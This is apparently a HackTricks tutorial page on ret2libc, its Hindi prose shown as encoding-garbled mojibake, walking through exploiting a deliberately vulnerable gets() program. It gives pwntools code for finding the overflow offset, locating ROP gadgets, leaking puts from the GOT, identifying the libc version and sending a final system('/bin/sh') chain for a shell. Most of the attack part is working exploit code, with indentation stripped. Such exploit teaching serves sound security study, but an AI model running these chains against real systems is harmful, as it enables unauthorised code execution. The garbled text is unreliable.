# ROP рдХреЗ рд╕рд╛рде libc рдкрддрд╛ рд▓рдЧрд╛рдирд╛

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рд╕реЗ рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рддреНрд╡рд░рд┐рдд рд╕рд╛рд░рд╛рдВрд╢

1. **рдУрд╡рд░рдлреНрд▓реЛ рдСрдлрд╕реЗрдЯ** рдЦреЛрдЬреЗрдВ
2. `POP_RDI` рдЧреИрдЬреЗрдЯ, `PUTS_PLT` рдФрд░ `MAIN` рдЧреИрдЬреЗрдЯ рдЦреЛрдЬреЗрдВ
3. рдкрд┐рдЫрд▓реЗ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ puts рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп libc рдлрд╝рдВрдХреНрд╢рди рдХреА рдореЗрдореЛрд░реА рдкрддрд╛ **рд▓реАрдХ рдХрд░реЗрдВ** рдФрд░ **libc рд╕рдВрд╕реНрдХрд░рдг рдкрддрд╛ рдХрд░реЗрдВ** ([рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ](https://libc.blukat.me))
4. рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рд╛рде, **ROP рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░реЗрдВ**

## рдЕрдиреНрдп рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдФрд░ рдмрд╛рдЗрдирд░реА рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

рдпрд╣ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдЙрд╕ рдХреЛрдб/рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЗрд╕ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
рдФрд░ рдПрдХ рдЙрдкрдпреЛрдЧреА рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## рдХреЛрдб

рдлрд╝рд╛рдЗрд▓рдирд╛рдо: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ

рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рд╡рд┐рдХрд▓реНрдкреА рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд░рдЦреЗрдВ рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдбреЗрдЯрд╛ рджреЗрдВ:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- рдСрдлрд╕реЗрдЯ рдЦреЛрдЬрдирд╛

рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдПрдХ рдСрдлрд╕реЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред рдпрджрд┐ рдХреЛрдИ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЙрд╕реЗ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХреЛрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░реЗрдЧрд╛ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** `python template.py` рдПрдХ GDB рдХрдиреНрд╕реЛрд▓ рдЦреБрд▓реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреНрд░реИрд╢ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЙрд╕ **GDB рдХрдиреНрд╕реЛрд▓** рдореЗрдВ `x/wx $rsp` рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ RIP рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **рдмрд╛рдЗрдЯреНрд╕** рдкреНрд░рд╛рдкреНрдд рд╣реЛрдВред рдЕрдВрддрддрдГ рдПрдХ **python** рдХрдиреНрд╕реЛрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдСрдлрд╕реЗрдЯ** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1004).png>)

рдСрдлрд╕реЗрдЯ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 40) рдкрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЙрд╕ рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рдЕрдВрджрд░ OFFSET рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдмрджрд▓реЗрдВред\
`OFFSET = "A" * 40`

рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ: `pattern create 1000` -- _рд░рд┐рдЯрд░реНрди рддрдХ рдЪрд▓рд╛рдПрдВ_ -- `pattern seach $rsp` GEF рд╕реЗред

## 2- рдЧреИрдЬреЗрдЯреНрд╕ рдЦреЛрдЬрдирд╛

рдЕрдм рд╣рдореЗрдВ рдмрд╛рдЗрдирд░реА рдХреЗ рдЕрдВрджрд░ ROP рдЧреИрдЬреЗрдЯреНрд╕ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпреЗ ROP рдЧреИрдЬреЗрдЯреНрд╕ `puts` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдВрдЧреЗ **libc** рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдФрд░ рдмрд╛рдж рдореЗрдВ **рдЕрдВрддрд┐рдо рдзреЛрдЦрд╛рдзрдбрд╝реА рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдПред
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` рдХреЛ **рдлрд╝рдВрдХреНрд╢рди puts** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред
`MAIN_PLT` рдХреЛ **рдореБрдЦреНрдп рдлрд╝рдВрдХреНрд╢рди** рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдПрдХ рдЗрдВрдЯрд░реЗрдХреНрд╢рди рдХреЗ рдмрд╛рдж **рдУрд╡рд░рдлрд╝реНрд▓реЛ** рдХреЛ **рдлрд┐рд░ рд╕реЗ рд╢рд╛рдВрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** (рдЕрд╕реАрдорд┐рдд рджреМрд░реЛрдВ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг)ред **рд╣рд░ ROP рдХреЗ рдЕрдВрдд рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред
**POP\_RDI** рдХреЛ **рдмреБрд▓рд╛рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди** рдХреЛ **рдкреИрд░рд╛рдореАрдЯрд░** рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЗрд╕ рдЪрд░рдг рдореЗрдВ рдЖрдкрдХреЛ рдХреБрдЫ рднреА рдирд╣реАрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдкреВрдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди рд╕рднреА рдЪреАрдЬреЗрдВ рдорд┐рд▓ рдЬрд╛рдПрдВрдЧреАред

## 3- рд▓рд┐рдмрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЦреЛрдЬрдирд╛

рдЕрдм рд╕рдордп рд╣реИ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдХрд┐ рдХреМрди рд╕реА **libc** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ **рдореЗрдореЛрд░реА** рдореЗрдВ **рдлрд╝рдВрдХреНрд╢рди** `puts` рдХрд╛ **рдкрддрд╛** рд▓рдЧрд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ рд╣рдореЗрдВ рдЗрд╕ рдкрддреЗ рдореЗрдВ рдХреМрди рд╕рд╛ **рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╕рдВрд╕реНрдХрд░рдг** рд╣реИ рдЙрд╕реЗ рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ред
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХреА рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд▓рд╛рдЗрди рд╣реИ:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
рдпрд╣ рдХреБрдЫ рдмрд╛рдЗрдЯ рднреЗрдЬреЗрдЧрд╛ рдЬрдм рддрдХ **RIP** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ: `OFFSET`ред\
рдлрд┐рд░, рдпрд╣ **рдЧреИрдЬреЗрдЯ** `POP_RDI` рдХрд╛ **рдкрддрд╛** рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдЕрдЧрд▓рд╛ рдкрддрд╛ (`FUNC_GOT`) **RDI** рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ **puts** рдХреЛ **рдмреБрд▓рд╛рдирд╛** рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо **рдкрд╛рд╕** рдХрд░ рд░рд╣реЗ рд╣реИрдВ `PUTS_GOT` рдХрд╛ **рдкрддрд╛** рдЬреИрд╕реЗ рд╣реА рдореЗрдореЛрд░реА рдореЗрдВ puts рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ `PUTS_GOT` рджреНрд╡рд╛рд░рд╛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЙрд╕рдХреЗ рдмрд╛рдж, `PUTS_PLT` рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ (`PUTS_GOT` рдХреЗ рдЕрдВрджрд░ **RDI** рдХреЗ рд╕рд╛рде) рддрд╛рдХрд┐ puts **PUTS_GOT** рдХреЗ рдЕрдВрджрд░ рдХрдВрдЯреЗрдВрдЯ рдкрдврд╝ рд╕рдХреЗ (**рдореЗрдореЛрд░реА рдореЗрдВ puts рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛**) рдФрд░ рдЗрд╕реЗ **рдкреНрд░рд┐рдВрдЯ** рдХрд░реЗрдЧрд╛ред\
рдЕрдВрдд рдореЗрдВ, **рдореБрдЦреНрдп рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╣рдо рдлрд┐рд░ рд╕реЗ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХреЗрдВред

рдЗрд╕ рддрд░рд╣ рд╣рдордиреЗ **puts рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдзреЛрдЦрд╛ рджрд┐рдпрд╛** рд╣реИ рдХрд┐ рд╡рд╣ **рдореЗрдореЛрд░реА** рдореЗрдВ **puts** рдлрд╝рдВрдХреНрд╢рди рдХрд╛ **рдкрддрд╛ рдкреНрд░рд┐рдВрдЯ** рдХрд░реЗ (рдЬреЛ **libc** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрджрд░ рд╣реИ)ред рдЕрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЙрд╕ рдкрддреЗ рдХреЗ рд╕рд╛рде рд╣реИ рддреЛ рд╣рдо **рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА libc рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ**ред

![](<../../../../.gitbook/assets/image (1046).png>)

рд╣рдо рдХрд┐рд╕реА **рд╕реНрдерд╛рдиреАрдп** рдмрд╛рдЗрдирд░реА рдХрд╛ **рд╢реЛрд╖рдг** рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЗрд╕рд▓рд┐рдП рдпрд╣ **рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ** рдХрд┐ рд╣рдореЗрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ **libc** рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдХреЗрд╡рд▓ `/lib/x86_64-linux-gnu/libc.so.6` рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЦреЛрдЬреЗрдВ)ред\
рд▓реЗрдХрд┐рди, рджреВрд░рд╕реНрде рд╢реЛрд╖рдг рдорд╛рдорд▓реЗ рдореЗрдВ рдореИрдВ рдпрд╣рд╛рдБ рд╡рд┐рд╡рд░рдг рджреВрдВрдЧрд╛ рдХрд┐ рдЖрдк рдЗрд╕реЗ рдХреИрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:

### 3.1- libc рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЦреЛрдЬ (1)

рдЖрдк рд╡реЗрдм рдкреГрд╖реНрда рдкрд░ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ: [https://libc.blukat.me/](https://libc.blukat.me)\
рдпрд╣ рдЖрдкрдХреЛ **libc** рдХреЗ рдЦреЛрдЬреЗ рдЧрдП рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

![](<../../../../.gitbook/assets/image (218).png>)

### 3.2- libc рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЦреЛрдЬ (2)

рдЖрдк рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

рдЗрд╕рдореЗрдВ рдХреБрдЫ рд╕рдордп рд▓рдЧреЗрдЧрд╛, рдзреИрд░реНрдп рд░рдЦреЗрдВред\
рдЗрд╕рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдЪрд╛рд╣рд┐рдП:

* Libc рд╕рд┐рдореНрдмрд▓ рдирд╛рдо: `puts`
* рд▓реАрдХреЗрдб libc рдкрддрд╛: `0x7ff629878690`

рд╣рдо рдпрд╣ рддрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА **libc** рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИред
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
рд╣рдореЗрдВ 2 рдореИрдЪ рдорд┐рд▓рддреЗ рд╣реИрдВ (рдЕрдЧрд░ рдкрд╣рд▓рд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдкрдХреЛ рджреВрд╕рд░рд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)ред рдкрд╣рд▓рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
### 3.3- рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рди

`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` рд╕реЗ libc рдХреА рдХреЙрдкреА рд╣рдорд╛рд░реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдХрд░реЗрдВред
```python
puts
printf
__libc_start_main
read
gets
```
## 4- рдЖрдзрд╛рд░рд┐рдд libc рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдФрд░ рдЙрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛

рдЗрд╕ рдмрд┐рдВрдЕрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рд╣рдореЗрдВ рд▓рд┐рдмреНрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдореИрдВ рдмрд╕ рдпрд╣рд╛рдБ рдкреНрд░рдпреЛрдЧ рдХрд░реВрдВрдЧрд╛: `/lib/x86_64-linux-gnu/libc.so.6`

рдЗрд╕рд▓рд┐рдП, `template.py` рдХреЗ рд╢реБрд░реВ рдореЗрдВ **libc** рдЪрд░ рдХреЛ рдмрджрд▓реЗрдВ: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libc рдкреБрд╕реНрддрдХрд╛рд▓рдп** рдХреЗ **рдкрде** рджреЗрдиреЗ рд╕реЗ **рд╢реЛрд╖рдг рдХрд╛ рд╢реЗрд╖ рднрд╛рдЧ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ** рд╣реЛрдЧрд╛ред

`get_addr` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ **libc рдХрд╛ рдЖрдзрд╛рд░ рдкрддрд╛** рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо libc рдмреЗрд╕ рдкрддрд╛ 00 рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдпрджрд┐ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдкрдиреЗ рдЧрд▓рдд рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рд▓реАрдХ рдХрд┐рдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рдлрд┐рд░, **рд╕рд┐рд╕реНрдЯрдо** рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдФрд░ **_"/bin/sh"_** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ **рдкрддреЗ** рдХреЛ **рдЧрдгрдирд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ **libc** рдХреЗ **рдмреЗрд╕ рдкрддреЗ** рд╕реЗ рдФрд░ рджрд┐рдП рдЧрдП **libc рдкреБрд╕реНрддрдХрд╛рд▓рдп**ред
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
рдЕрдВрдд рдореЗрдВ, /bin/sh рдирд┐рд╖реНрдкрд╛рджрди рдЙрддреНрдкреАрдбрд╝рди рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
рдЖрдЦрд┐рд░реА ROP (`rop1`) рдлрд┐рд░ рд╕реЗ рдореБрдЦреНрдп рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдХрд░ рд╕рдорд╛рдкреНрдд рд╣реБрдЖ, рддреЛ рд╣рдо **рдлрд┐рд░ рд╕реЗ рд╢реЛрд╖рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдУрд╡рд░рдлреНрд▓реЛ** (рдЗрд╕рд▓рд┐рдП `OFFSET` рдпрд╣рд╛рдБ рдлрд┐рд░ рд╕реЗ рд╣реИ)ред рдлрд┐рд░, рд╣рдо _"/bin/sh"_ рдХреЗ **рдкрддреЗ** (`BINSH`) рдХреЛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП `POP_RDI` рдХреЛ рдмреБрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **рд╕рд┐рд╕реНрдЯрдо** рдлрд╝рдВрдХреНрд╢рди (`SYSTEM`) рдХреЛ рдмреБрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ _"/bin/sh"_ рдХрд╛ рдкрддрд╛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
